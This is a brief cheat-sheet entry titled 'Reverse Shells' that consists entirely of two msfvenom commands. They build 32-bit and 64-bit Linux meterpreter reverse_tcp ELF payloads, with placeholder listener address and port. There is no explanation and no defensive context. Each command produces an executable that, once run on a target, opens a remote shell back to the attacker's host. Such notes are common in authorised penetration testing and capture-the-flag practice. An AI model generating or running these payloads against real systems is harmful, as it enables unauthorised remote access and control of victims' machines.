# Reverse Shells

x86 (32-bit) payload.

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o payload-x86
```

x86-64 (64-bit) payload.

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o payload-x64
```